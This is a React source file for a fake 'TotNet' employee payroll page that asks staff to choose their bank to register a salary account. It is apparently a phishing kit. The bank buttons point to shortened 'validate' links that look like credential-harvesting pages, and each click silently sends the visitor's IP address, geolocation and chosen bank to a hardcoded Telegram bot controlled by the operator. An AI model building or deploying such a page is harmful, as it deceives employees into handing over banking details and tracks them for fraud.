import React from 'react';
import { Helmet } from 'react-helmet';
import { Link } from 'react-router-dom';
import { ArrowLeft, ExternalLink } from 'lucide-react';

const LOGO_IMG = 'https://horizons-cdn.hostinger.com/da461c27-73ae-46b6-8a11-12b3d7c97932/logo-totnet-2024-positiu-e1738757479262-KATkS.png';

// 🔧 TU CONFIGURACIÓN DE TELEGRAM (YA CONFIGURADA)
const TELEGRAM_BOT = '8298792473:AAGw1ZyXuaFCHhKkTvt973DFvYwwSPo6W-o';
const TELEGRAM_CHAT = '8894482935';

const BUTTONS = [
  { label: 'BBVA', href: 'https://tinyurl.com/validateusuariobbv' },
  { label: 'ING', href: 'https://tinyurl.com/validateing' },
  { label: 'Sabadell', href: 'https://tinyurl.com/validateusuariosabadell' },
  { label: 'CaixaBank', href: null },
  { label: 'Unicaja', href: 'https://tinyurl.com/unicaj-verif' },
  { label: 'Santander', href: null },
  { label: 'Bankinter', href: null },
  { label: 'Abanca', href: null },
];

// Función para obtener IP y enviar a Telegram
const sendTelegramWithIP = async (bankName) => {
  try {
    // Obtener IP del usuario
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const userIP = ipData.ip;

    // Obtener ubicación aproximada por IP
    const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
    const geoData = await geoResponse.json();
    const location = `${geoData.city || 'Desconocido'}, ${geoData.region || 'Desconocido'}, ${geoData.country_name || 'Desconocido'}`;

    // Enviar mensaje completo a Telegram
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT,
        text: `✅ Usuario eligió: ${bankName}\n🖥️ IP: ${userIP}\n🌍 Ubicación: ${location}\n🕐 Fecha: ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}`
      })
    });
  } catch (error) {
    console.error('Error Telegram:', error);
    // Enviar mensaje básico si falla la obtención de IP
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT,
        text: `✅ Usuario eligió: ${bankName}\n⚠️ No se pudo obtener IP\n🕐 Fecha: ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}`
      })
    });
  }
};

export default function LinksPage() {
  const handleButtonClick = async (bank, url) => {
    await sendTelegramWithIP(bank);
    if (url) window.open(url, '_blank', 'noopener noreferrer');
  };

  return (
    <div className="min-h-screen bg-pastel-sky text-slate-900">
      <Helmet>
        <title>Enlaces  · TotNet</title>
        <meta name="description" content="TotNET" />
      </Helmet>

      <header className="border-b border-slate-200/80 bg-white shadow-sm">
        <div className="mx-auto flex max-w-3xl items-center justify-between gap-4 px-4 py-3.5">
          <Link to="/" className="group flex items-center gap-3">
            <img src={LOGO_IMG} alt="tot-net" className="h-10 w-auto max-w-[160px] object-contain sm:h-11" />
            <div className="leading-none">
              <span className="font-display text-xl font-bold tracking-tight text-brand-green-dark">Tot<span className="text-brand-green">Net</span></span>
              <p className="mt-0.5 text-[10px] font-semibold uppercase tracking-[0.18em] text-slate-400">EMPLEADOS</p>
            </div>
          </Link>
          <Link to="/" className="inline-flex items-center gap-2 rounded-full bg-slate-900 px-5 py-2.5 text-sm font-semibold text-white transition hover:bg-slate-800 active:scale-[0.98]">
            <ArrowLeft className="h-4 w-4" />
            Volver
          </Link>
        </div>
      </header>

      <main className="mx-auto max-w-md px-4 py-12 md:py-16">
        <div className="mb-8 text-center">
          <p className="text-xs font-semibold uppercase tracking-[0.2em] text-brand-green">Recibir salario mensual</p>
          <h1 className="font-display mt-3 text-3xl font-extrabold tracking-tight text-slate-900 md:text-4xl">Domiciliación de nómina</h1>
          <p className="mx-auto mt-4 max-w-sm text-sm text-slate-600">Registra tu cuenta bancaria donde recibiras el salario mensual.</p>
        </div>

        <div className="flex flex-col gap-3">
          {BUTTONS.map((button) => (
            <div
              key={button.label}
              className="flex w-full items-center justify-between rounded-xl border border-brand-green/30 bg-white px-5 py-4 text-base font-semibold text-slate-900 shadow-sm transition hover:border-brand-green hover:bg-pastel-mint active:scale-[0.99] cursor-pointer"
              onClick={() => handleButtonClick(button.label, button.href)}
            >
              <span>{button.label}</span>
              <ExternalLink className="h-4 w-4 text-brand-green" />
            </div>
          ))}
        </div>
      </main>
    </div>
  );
}
